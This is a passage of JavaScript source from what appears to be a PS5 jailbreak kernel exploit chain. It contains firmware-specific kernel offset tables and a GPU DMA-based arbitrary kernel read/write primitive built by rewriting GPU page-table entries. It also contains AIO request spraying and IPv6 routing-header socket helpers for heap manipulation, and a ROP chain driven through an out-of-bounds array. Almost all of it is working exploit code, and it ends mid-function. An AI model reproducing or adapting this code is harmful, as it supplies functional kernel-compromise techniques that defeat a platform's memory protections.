    "9.60": offset_9_05_to_9_60,
    "10.00": offset_10_00_to_10_01,
    "10.01": offset_10_00_to_10_01,
};

kernel_offset = null;

function get_kernel_offset(FW_VERSION) {

    //logger.log("inside get_kernel_offset FW_VERSION: '" + FW_VERSION + "'");
    
    const offsets = ps5_kernel_offset_list[FW_VERSION];
    
    if (!offsets) {
        throw new Error("Unsupported firmware version: " + FW_VERSION);
    }
    
    kernel_offset = { ...offsets };
    
    kernel_offset.DATA_BASE_TARGET_ID = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x09n;
    kernel_offset.DATA_BASE_QA_FLAGS = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x24n;
    kernel_offset.DATA_BASE_UTOKEN_FLAGS = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x8Cn;
    
    // proc structure
    kernel_offset.PROC_FD = 0x48n;
    kernel_offset.PROC_PID = 0xbcn;
    kernel_offset.PROC_VM_SPACE = 0x200n;
    kernel_offset.PROC_COMM = -1n;
    kernel_offset.PROC_SYSENT = -1n;
    
    // filedesc
    kernel_offset.FILEDESC_OFILES = 0x8n;
    kernel_offset.SIZEOF_OFILES = 0x30n;
    
    // vmspace structure
    kernel_offset.VMSPACE_VM_PMAP = -1n;
    kernel_offset.VMSPACE_VM_VMID = -1n;
    
    // pmap structure
    kernel_offset.PMAP_CR3 = 0x28n;
    
    // gpu vmspace structure
    kernel_offset.SIZEOF_GVMSPACE = 0x100n;
    kernel_offset.GVMSPACE_START_VA = 0x8n;
    kernel_offset.GVMSPACE_SIZE = 0x10n;
    kernel_offset.GVMSPACE_PAGE_DIR_VA = 0x38n;
    
    // net
    kernel_offset.SO_PCB = 0x18n;
    kernel_offset.INPCB_PKTOPTS = 0x120n;
    
    return kernel_offset;
}

function find_vmspace_pmap_offset() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
    
    // Note, this is the offset of vm_space.vm_map.pmap on 1.xx.
    // It is assumed that on higher firmwares it's only increasing'
    const cur_scan_offset = 0x1C8n;
    
    for (let i = 1; i <= 6; i++) {
        const scan_val = kernel.read_qword(vmspace + cur_scan_offset + BigInt(i * 8));
        const offset_diff = Number(scan_val - vmspace);
        
        if (offset_diff >= 0x2C0 && offset_diff <= 0x2F0) {
            return cur_scan_offset + BigInt(i * 8);
        }
    }
    
    throw new Error("failed to find VMSPACE_VM_PMAP offset");
}


function find_vmspace_vmid_offset() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
    
    // Note, this is the offset of vm_space.vm_map.vmid on 1.xx.
    // It is assumed that on higher firmwares it's only increasing'
    const cur_scan_offset = 0x1D4n;
    
    for (let i = 1; i <= 8; i++) {
        const scan_offset = cur_scan_offset + BigInt(i * 4);
        const scan_val = Number(kernel.read_dword(vmspace + scan_offset));
        
        if (scan_val > 0 && scan_val <= 0x10) {
            return scan_offset;
        }
    }
    
    throw new Error("failed to find VMSPACE_VM_VMID offset");
}

function find_proc_offsets() {
    const proc_data = kernel.read_buffer(kernel.addr.curproc, 0x1000);
    
    const p_comm_sign = find_pattern(proc_data, "ce fa ef be cc bb");
    const p_sysent_sign = find_pattern(proc_data, "ff ff ff ff ff ff ff 7f");
    
    if (p_comm_sign.length === 0) {
        throw new Error("failed to find offset for PROC_COMM");
    }
    
    if (p_sysent_sign.length === 0) {
        throw new Error("failed to find offset for PROC_SYSENT");
    }
    
    const p_comm_offset = BigInt(p_comm_sign[0] + 0x8);
    const p_sysent_offset = BigInt(p_sysent_sign[0] - 0x10);
    
    return {
        PROC_COMM: p_comm_offset,
        PROC_SYSENT: p_sysent_offset
    };
}

function find_additional_offsets() {
    const proc_offsets = find_proc_offsets();
    
    const vm_map_pmap_offset = find_vmspace_pmap_offset();
    const vm_map_vmid_offset = find_vmspace_vmid_offset();
    
    return {
        PROC_COMM: proc_offsets.PROC_COMM,
        PROC_SYSENT: proc_offsets.PROC_SYSENT,
        VMSPACE_VM_PMAP: vm_map_pmap_offset,
        VMSPACE_VM_VMID: vm_map_vmid_offset,
    };
}

function update_kernel_offsets() {
    const offsets = find_additional_offsets();
    
    for (const [key, value] of Object.entries(offsets)) {
        kernel_offset[key] = value;
    }
}

/***** gpu.js *****/
// GPU page table

GPU_PDE_SHIFT = {
    VALID: 0,
    IS_PTE: 54,
    TF: 56,
    BLOCK_FRAGMENT_SIZE: 59,
};

GPU_PDE_MASKS = {
    VALID: 1n,
    IS_PTE: 1n,
    TF: 1n,
    BLOCK_FRAGMENT_SIZE: 0x1fn,
};

GPU_PDE_ADDR_MASK = 0x0000ffffffffffc0n;

function gpu_pde_field(pde, field) {
    const shift = GPU_PDE_SHIFT[field];
    const mask = GPU_PDE_MASKS[field];
    return (pde >> BigInt(shift)) & mask;
}

function gpu_walk_pt(vmid, virt_addr) {
    const pdb2_addr = get_pdb2_addr(vmid);
    
    const pml4e_index = (virt_addr >> 39n) & 0x1ffn;
    const pdpe_index = (virt_addr >> 30n) & 0x1ffn;
    const pde_index = (virt_addr >> 21n) & 0x1ffn;
    
    // PDB2
    const pml4e = kernel.read_qword(pdb2_addr + pml4e_index * 8n);
    
    if (gpu_pde_field(pml4e, "VALID") !== 1n) {
        return null;
    }
    
    // PDB1
    const pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK;
    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
    const pdpe = kernel.read_qword(pdpe_va);
    
    if (gpu_pde_field(pdpe, "VALID") !== 1n) {
        return null;
    }
    
    // PDB0
    const pd_base_pa = pdpe & GPU_PDE_ADDR_MASK;
    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
    const pde = kernel.read_qword(pde_va);
    
    if (gpu_pde_field(pde, "VALID") !== 1n) {
        return null;
    }
    
    if (gpu_pde_field(pde, "IS_PTE") === 1n) {
        return [pde_va, 0x200000n]; // 2MB
    }
    
    // PTB
    const fragment_size = gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE");
    const offset = virt_addr & 0x1fffffn;
    const pt_base_pa = pde & GPU_PDE_ADDR_MASK;
    
    let pte_index, pte;
    let pte_va, page_size;
    
    if (fragment_size === 4n) {
        pte_index = offset >> 16n;
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
        pte = kernel.read_qword(pte_va);
        
        if (gpu_pde_field(pte, "VALID") === 1n && gpu_pde_field(pte, "TF") === 1n) {
            pte_index = (virt_addr & 0xffffn) >> 13n;
            pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
            page_size = 0x2000n; // 8KB
        } else {
            page_size = 0x10000n; // 64KB
        }
    } else if (fragment_size === 1n) {
        pte_index = offset >> 13n;
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
        page_size = 0x2000n; // 8KB
    }
    
    return [pte_va, page_size];
}

// Kernel r/w primitives based on GPU DMA

gpu = {};

gpu.dmem_size = 2n * 0x100000n; // 2MB
gpu.fd = null; // GPU device file descriptor

// Direct ioctl helper functions

gpu.build_command_descriptor = function(gpu_addr, size_in_bytes) {
    // Each descriptor is 16 bytes (2 qwords)
    
    const desc = malloc(16);
    const size_in_dwords = BigInt(size_in_bytes) >> 2n;
    
    // First qword: (gpu_addr_low32 << 32) | 0xC0023F00
    const qword0 = ((gpu_addr & 0xFFFFFFFFn) << 32n) | 0xC0023F00n;
    
    // Second qword: (size_in_dwords << 32) | (gpu_addr_high16)
    const qword1 = ((size_in_dwords & 0xFFFFFn) << 32n) | ((gpu_addr >> 32n) & 0xFFFFn);
    
    write64_uncompressed(desc, qword0);
    write64_uncompressed(desc + 8n, qword1);
    
    return desc;
};

gpu.ioctl_submit_commands = function(pipe_id, cmd_count, cmd_descriptors_ptr) {
    // ioctl 0xC0108102
    // Structure: [dword pipe_id][dword count][qword cmd_buf_ptr]
    
    const submit_struct = malloc(0x10);
    write32_uncompressed(submit_struct + 0x0n, BigInt(pipe_id));
    write32_uncompressed(submit_struct + 0x4n, BigInt(cmd_count));
    write64_uncompressed(submit_struct + 0x8n, cmd_descriptors_ptr);
    
    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0108102n, submit_struct);
    if (ret !== 0n) {
        throw new Error("ioctl submit failed: " + hex(ret));
    }
};

// may be not needed...
gpu.ioctl_gpu_sync = function() {
    // ioctl 0xC0048117
    // Structure: [dword value] (set to 0)
    
    const sync_struct = malloc(0x4);
    write32_uncompressed(sync_struct, 0n);
    
    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0048117n, sync_struct);

};

gpu.ioctl_wait_done = function() {
    // ioctl 0xC0048116
    // Structure: [dword value] (set to 0)
    
    const wait_struct = malloc(0x4);
    write32_uncompressed(wait_struct, 0n);
    
    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0048116n, wait_struct);
    
    // We just ignore error lol
    //if (ret !== 0n) {
    //    throw new Error("ioctl wait_done failed: " + hex(ret));
    //}
    
    // Manual sleep - temp fix
    nanosleep(1000000000);
};

gpu.setup = function() {
    check_kernel_rw();
    
    // Open GPU device directly
    gpu.fd = syscall(SYSCALL.open, alloc_string("/dev/gc"), O_RDWR);
    if (gpu.fd === 0xffffffffffffffffn) {
        throw new Error("Failed to open /dev/gc");
    }
    
    const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
    const prot_rw = prot_ro | GPU_WRITE;
    
    const victim_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    const transfer_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    const cmd_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    
    const curproc_cr3 = get_proc_cr3(kernel.addr.curproc);
    const victim_real_pa = virt_to_phys(victim_va, curproc_cr3);
    
    const result = get_ptb_entry_of_relative_va(victim_va);
    if (!result) {
        throw new Error("failed to setup gpu primitives");
    }
    
    const [victim_ptbe_va, page_size] = result;
    
    if (!victim_ptbe_va || page_size !== gpu.dmem_size) {
        throw new Error("failed to setup gpu primitives");
    }
    
    if (syscall(SYSCALL.mprotect, victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }
    
    const initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va);
    const cleared_victim_ptbe_for_ro = initial_victim_ptbe_for_ro & (~victim_real_pa);
    
    gpu.victim_va = victim_va;
    gpu.transfer_va = transfer_va;
    gpu.cmd_va = cmd_va;
    gpu.victim_ptbe_va = victim_ptbe_va;
    gpu.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro;
};

gpu.pm4_type3_header = function(opcode, count) {
    
    const packet_type = 3n;
    const shader_type = 1n;  // compute shader
    const predicate = 0n;    // predicate disable
    
    const result = (
        (predicate & 0x0n) |                      // Predicated version of packet when set
        ((shader_type & 0x1n) << 1n) |            // 0: Graphics, 1: Compute Shader
        ((opcode & 0xffn) << 8n) |        // IT opcode
        (((count - 1n) & 0x3fffn) << 16n) |  // Number of DWORDs - 1 in the information body
        ((packet_type & 0x3n) << 30n)             // Packet identifier. It should be 3 for type 3 packets
    );
    
    return result & 0xFFFFFFFFn;
};

gpu.pm4_dma_data = function(dest_va, src_va, length) {
    const count = 6n;
    const bufsize = Number(4n * (count + 1n));
    const opcode = 0x50n;
    const command_len = BigInt(length) & 0x1fffffn;
    
    const pm4 = malloc(bufsize);
    
    const dma_data_header = (
        (0n & 0x1n) |                    // engine
        ((0n & 0x1n) << 12n) |           // src_atc
        ((2n & 0x3n) << 13n) |           // src_cache_policy
        ((1n & 0x1n) << 15n) |           // src_volatile
        ((0n & 0x3n) << 20n) |           // dst_sel (DmaDataDst enum)
        ((0n & 0x1n) << 24n) |           // dst_atc
        ((2n & 0x3n) << 25n) |           // dst_cache_policy
        ((1n & 0x1n) << 27n) |           // dst_volatile
        ((0n & 0x3n) << 29n) |           // src_sel (DmaDataSrc enum)
        ((1n & 0x1n) << 31n)             // cp_sync
    ) & 0xFFFFFFFFn;
    
    write32_uncompressed(pm4, gpu.pm4_type3_header(opcode, count)); // pm4 header
    write32_uncompressed(pm4 + 0x4n, dma_data_header); // dma data header (copy: mem -> mem)
    write32_uncompressed(pm4 + 0x8n, src_va & 0xFFFFFFFFn);
    write32_uncompressed(pm4 + 0xcn, src_va >> 32n);
    write32_uncompressed(pm4 + 0x10n, dest_va & 0xFFFFFFFFn);
    write32_uncompressed(pm4 + 0x14n, dest_va >> 32n);
    write32_uncompressed(pm4 + 0x18n, command_len);
    
    return read_buffer(pm4, bufsize);
};

gpu.submit_dma_data_command = function(dest_va, src_va, size) {
    // Prep command buf
    const dma_data = gpu.pm4_dma_data(dest_va, src_va, size);
    write_buffer(gpu.cmd_va, dma_data);
    
    // Build command descriptor manually
    const desc = gpu.build_command_descriptor(gpu.cmd_va, dma_data.length);
    
    const pipe_id = 0;
    
    gpu.ioctl_gpu_sync();
    
    // Submit to gpu via direct ioctl
    gpu.ioctl_submit_commands(pipe_id, 1, desc);
    
    gpu.ioctl_gpu_sync();
    
    // Wait for completion
    gpu.ioctl_wait_done();
};

gpu.transfer_physical_buffer = function(phys_addr, size, is_write) {
    const trunc_phys_addr = phys_addr & ~(gpu.dmem_size - 1n);
    const offset = phys_addr - trunc_phys_addr;
    
    if (offset + BigInt(size) > gpu.dmem_size) {
        throw new Error("error: trying to write more than direct memory size: " + size);
    }
    
    const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
    const prot_rw = prot_ro | GPU_WRITE;
    
    // Remap PTD
    if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }
    
    const new_ptb = gpu.cleared_victim_ptbe_for_ro | trunc_phys_addr;
    kernel.write_qword(gpu.victim_ptbe_va, new_ptb);
    
    if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_rw) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }
    
    let src, dst;
    
    if (is_write) {
        src = gpu.transfer_va;
        dst = gpu.victim_va + offset;
    } else {
        src = gpu.victim_va + offset;
        dst = gpu.transfer_va;
    }
    
    // Do the DMA operation
    gpu.submit_dma_data_command(dst, src, size);
};

gpu.read_buffer = function(addr, size) {
    const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
    if (!phys_addr) {
        throw new Error("failed to translate " + hex(addr) + " to physical addr");
    }
    
    gpu.transfer_physical_buffer(phys_addr, size, false);
    return read_buffer(gpu.transfer_va, size);
};

gpu.write_buffer = function(addr, buf) {
    const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
    if (!phys_addr) {
        throw new Error("failed to translate " + hex(addr) + " to physical addr");
    }
    
    write_buffer(gpu.transfer_va, buf); // prepare data for write
    gpu.transfer_physical_buffer(phys_addr, buf.length, true);
};

gpu.read_byte = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 1);
    return value && value.length === 1 ? BigInt(value[0]) : null;
};

gpu.read_word = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
};

gpu.read_dword = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

gpu.read_qword = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

gpu.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    gpu.write_buffer(dest, buf);
};

gpu.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    gpu.write_buffer(dest, buf);
};

gpu.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    gpu.write_buffer(dest, buf);
};

gpu.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    gpu.write_buffer(dest, buf);
};

// Misc functions

function alloc_main_dmem(size, prot, flag) {
    if (!size || prot === null || prot === undefined) {
        throw new Error("alloc_main_dmem: size and prot are required");
    }
    
    const out = malloc(8);
    const mem_type = 1n;
    
    const size_big = typeof size === "bigint" ? size : BigInt(size);
    const prot_big = typeof prot === "bigint" ? prot : BigInt(prot);
    const flag_big = typeof flag === "bigint" ? flag : BigInt(flag);
    
    const ret = call(sceKernelAllocateMainDirectMemory, size_big, size_big, mem_type, out);
    if (ret !== 0n) {
        throw new Error("sceKernelAllocateMainDirectMemory() error: " + hex(ret));
    }
    
    const phys_addr = read64_uncompressed(out);
    write64_uncompressed(out, 0n);
    
    // Dummy name
    const name_buf = alloc_string("mem");
    
    //const ret2 = call(sceKernelMapNamedDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big, name_buf);
    const ret2 = call(sceKernelMapDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big);
    if (ret2 !== 0n) {
        //throw new Error("sceKernelMapNamedDirectMemory() error: " + hex(ret2));
        throw new Error("sceKernelMapDirectMemory() error: " + hex(ret2));
    }
    
    return read64_uncompressed(out);
}

function get_curproc_vmid() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
    const vmid = kernel.read_dword(vmspace + kernel_offset.VMSPACE_VM_VMID);
    return Number(vmid);
}

function get_gvmspace(vmid) {
    if (vmid === null || vmid === undefined) {
        throw new Error("vmid is required");
    }
    const vmid_big = typeof vmid === "bigint" ? vmid : BigInt(vmid);
    const gvmspace_base = kernel.addr.data_base + kernel_offset.DATA_BASE_GVMSPACE;
    return gvmspace_base + vmid_big * kernel_offset.SIZEOF_GVMSPACE;
}

function get_pdb2_addr(vmid) {
    const gvmspace = get_gvmspace(vmid);
    return kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_PAGE_DIR_VA);
}

function get_relative_va(vmid, va) {
    if (typeof va !== "bigint") {
        throw new Error("va must be BigInt");
    }
    
    const gvmspace = get_gvmspace(vmid);
    
    const size = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_SIZE);
    const start_addr = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_START_VA);
    const end_addr = start_addr + size;
    
    if (va >= start_addr && va < end_addr) {
        return va - start_addr;
    }
    
    return null;
}

function get_ptb_entry_of_relative_va(virt_addr) {
    const vmid = get_curproc_vmid();
    const relative_va = get_relative_va(vmid, virt_addr);
    
    if (!relative_va) {
        throw new Error("invalid virtual addr " + hex(virt_addr) + " for vmid " + vmid);
    }
    
    return gpu_walk_pt(vmid, relative_va);
}

logger.log("Init lapse_prepare_1.js");function wait_for(addr, threshold) {
    while (read64_uncompressed(addr) !== threshold) {
        nanosleep(1);
    }
}

function pin_to_core(core) {
    const mask = malloc(0x10);
    write32_uncompressed(mask, BigInt(1 << core));
    syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, -1n, 0x10n, mask);
}

function get_core_index(mask_addr) {
    let num = Number(read32_uncompressed(mask_addr));
    let position = 0;
    while (num > 0) {
        num = num >>> 1;
        position++;
    }
    return position - 1;
}

function get_current_core() {
    const mask = malloc(0x10);
    syscall(SYSCALL.cpuset_getaffinity, 3n, 1n, -1n, 0x10n, mask);
    return get_core_index(mask);
}

function set_rtprio(prio) {
    const rtprio = malloc(0x4);
    write16_uncompressed(rtprio, PRI_REALTIME);
    write16_uncompressed(rtprio + 2n, BigInt(prio));
    syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
}

function get_rtprio() {
    const rtprio = malloc(0x4);
    write16_uncompressed(rtprio, PRI_REALTIME);
    write16_uncompressed(rtprio + 2n, 0n);
    syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
    return read16_uncompressed(rtprio + 0x2n);
}

function new_socket() {
    const sd = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    if (sd === 0xffffffffffffffffn) {
        throw new Error("new_socket error: " + hex(sd));
    }
    return sd
}

function new_tcp_socket() {
    const sd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
    if (sd === 0xffffffffffffffffn) {
        throw new Error("new_tcp_socket error: " + hex(sd));
    }            
    return sd
}

function set_sockopt(sd, level, optname, optval, optlen) {
    const result = syscall(SYSCALL.setsockopt, BigInt(sd), level, optname, optval, BigInt(optlen));
    if (result === 0xffffffffffffffffn) {
        throw new Error("set_sockopt error: " + hex(result));
    }
    return result;
}

function get_sockopt(sd, level, optname, optval, optlen) {
    const len_ptr = malloc(4);
    write32_uncompressed(len_ptr, BigInt(optlen));
    const result = syscall(SYSCALL.getsockopt, BigInt(sd), level, optname, optval, len_ptr);
    if (result === 0xffffffffffffffffn) {
        throw new Error("get_sockopt error: " + hex(result));
    }
    return read32_uncompressed(len_ptr);
}

function set_rthdr(sd, buf, len) {
    return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function get_rthdr(sd, buf, max_len) {
    return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
}

function free_rthdrs(sds) {
    for (let i = 0; i < sds.length; i++) {
        if (sds[i] !== 0xffffffffffffffffn) {
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, 0n, 0);
        }
    }
}

function build_rthdr(buf, size) {
    const len = ((Number(size) >> 3) - 1) & ~1;
    const actual_size = (len + 1) << 3;
        write8_uncompressed(buf, 0n);
        write8_uncompressed(buf + 1n, BigInt(len));
        write8_uncompressed(buf + 2n, 0n);
        write8_uncompressed(buf + 3n, BigInt(len >> 1));
    return actual_size;
}

function aton(ip_str) {
    const parts = ip_str.split('.').map(Number);
    return (parts[3] << 24) | (parts[2] << 16) | (parts[1] << 8) | parts[0];
}

function aio_submit_cmd(cmd, reqs, num_reqs, priority, ids) {
    const result = syscall(SYSCALL.aio_submit_cmd, cmd, reqs, BigInt(num_reqs), priority, ids);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_submit_cmd error: " + hex(result));
    }
    return result;
}

function aio_multi_delete(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_delete, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_delete error: " + hex(result));
    }
    return result;
}

function aio_multi_poll(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_poll, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_poll error: " + hex(result));
    }
    return result;
}

function aio_multi_cancel(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_cancel, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_cancel error: " + hex(result));
    }
    return result;
}

function aio_multi_wait(ids, num_ids, states, mode, timeout) {
    const result = syscall(SYSCALL.aio_multi_wait, ids, BigInt(num_ids), states, BigInt(mode), timeout);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_wait error: " + hex(result));
    }
    return result;
}

function make_reqs1(num_reqs) {
    const reqs = malloc(0x28 * num_reqs);
    for (let i = 0; i < num_reqs; i++) {
        write32_uncompressed(reqs + BigInt(i * 0x28 + 0x20), -1n);
    }
    return reqs;
}

function spray_aio(loops, reqs, num_reqs, ids, multi, cmd) {
    loops = loops || 1;
    cmd = cmd || AIO_CMD_READ;
    if (multi === undefined) multi = true;

    const step = 4 * (multi ? num_reqs : 1);
    const final_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0n);

    for (let i = 0; i < loops; i++) {
        aio_submit_cmd(final_cmd, reqs, num_reqs, 3n, ids + BigInt(i * step));
    }
}

function cancel_aios(ids, num_ids) {
    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (let i = 0; i < num_batches; i++) {
        aio_multi_cancel(ids + BigInt(i * 4 * len), len, errors);
    }

    if (rem > 0) {
        aio_multi_cancel(ids + BigInt(num_batches * 4 * len), rem, errors);
    }
}

function free_aios(ids, num_ids, do_cancel) {
    if (do_cancel === undefined) do_cancel = true;

    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (let i = 0; i < num_batches; i++) {
        const addr = ids + BigInt(i * 4 * len);
        if (do_cancel) {
            aio_multi_cancel(addr, len, errors);
        }
        aio_multi_poll(addr, len, errors);
        aio_multi_delete(addr, len, errors);
    }

    if (rem > 0) {
        const addr = ids + BigInt(num_batches * 4 * len);
        if (do_cancel) {
            aio_multi_cancel(addr, rem, errors);
        }
        aio_multi_poll(addr, rem, errors);
        aio_multi_delete(addr, rem, errors);
    }
}

function free_aios2(ids, num_ids) {
    free_aios(ids, num_ids, false);
}

function call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid) {
    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n;

    let rop_i = 0;
    
    // write(pipe_write_fd, pipe_buf, 1)
    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.write;
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = pipe_write_fd;
    fake_rop[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
    fake_rop[rop_i++] = pipe_buf;
    fake_rop[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
    fake_rop[rop_i++] = 1n;
    fake_rop[rop_i++] = syscall_wrapper;
    
    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.sched_yield;
    fake_rop[rop_i++] = syscall_wrapper;
    
    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.thr_suspend_ucontext;
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = thr_tid;
    fake_rop[rop_i++] = syscall_wrapper;
    
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = base_heap_add + fake_rop_return;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret
    
    // Return safe tagged value to JavaScript
    fake_rop[rop_i++] = g.get('pop_rax'); // mov rax, 0x200000000 ; ret
    fake_rop[rop_i++] = 0x2000n;                 // Fake value in RAX to make JS happy
    fake_rop[rop_i++] = g.get('pop_rsp_pop_rbp');
    fake_rop[rop_i++] = real_rbp;
    
    write64(add_rop_smash_code_store, 0xab00260325n);
    oob_arr[39] = base_heap_add + fake_frame;
    rop_smash(obj_arr[0]);          // Call ROP
}

function call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid) {
    call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid);
    return read64(fake_rop_return);
}

function init_threading() {
   
    const jmpbuf = malloc(0x60);
    
    call(setjmp_addr, jmpbuf);
    saved_fpu_ctrl = Number(read32_uncompressed(jmpbuf + 0x40n));
    saved_mxcsr = Number(read32_uncompressed(jmpbuf + 0x44n));
}

function spawn_thread(fake_rop_race1_array) {
    const fake_rop_race1_addr = get_backing_store(fake_rop_race1_array);
    
    const jmpbuf = malloc(0x60);
    
    write64_uncompressed(jmpbuf + 0x00n, g.get('ret'));      // ret addr (RIP)
    write64_uncompressed(jmpbuf + 0x10n, fake_rop_race1_addr);             // RSP - pivot to fake_rop_race1
    write32_uncompressed(jmpbuf + 0x40n, BigInt(saved_fpu_ctrl));   // FPU control word
    write32_uncompressed(jmpbuf + 0x44n, BigInt(saved_mxcsr));      // MXCSR
    
    const stack_size = 0x400n;
    const tls_size = 0x40n;
    
    const thr_new_args = malloc(0x80);
    const tid_addr = malloc(0x8);
    const cpid = malloc(0x8);
    const stack = malloc(Number(stack_size));
    const tls = malloc(Number(tls_size));
    
    write64_uncompressed(thr_new_args + 0x00n, longjmp_addr);       // start_func = longjmp
    write64_uncompressed(thr_new_args + 0x08n, jmpbuf);             // arg = jmpbuf
    write64_uncompressed(thr_new_args + 0x10n, stack);              // stack_base
    write64_uncompressed(thr_new_args + 0x18n, stack_size);         // stack_size
    write64_uncompressed(thr_new_args + 0x20n, tls);                // tls_base
    write64_uncompressed(thr_new_args + 0x28n, tls_size);           // tls_size
    write64_uncompressed(thr_new_args + 0x30n, tid_addr);           // child_tid (output)
    write64_uncompressed(thr_new_args + 0x38n, cpid);               // parent_tid (output)
    
    const result = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
    
    if (result !== 0n) {
        throw new Error("thr_new failed: " + hex(result));
    }
    
    const tid = read64_uncompressed(tid_addr);
    return tid;
}

function setup() {
    try {

        init_threading();

        ready_signal = malloc(8);
        deletion_signal = malloc(8);
        pipe_buf = malloc(8);
        write64_uncompressed(ready_signal, 0n);
        write64_uncompressed(deletion_signal, 0n);

        prev_core = get_current_core();
        prev_rtprio = get_rtprio();
        
        pin_to_core(MAIN_CORE);
        set_rtprio(MAIN_RTPRIO);

        logger.log("Pinned to core " + get_current_core() + " with prio " + MAIN_RTPRIO);
        
        const sockpair = malloc(8);
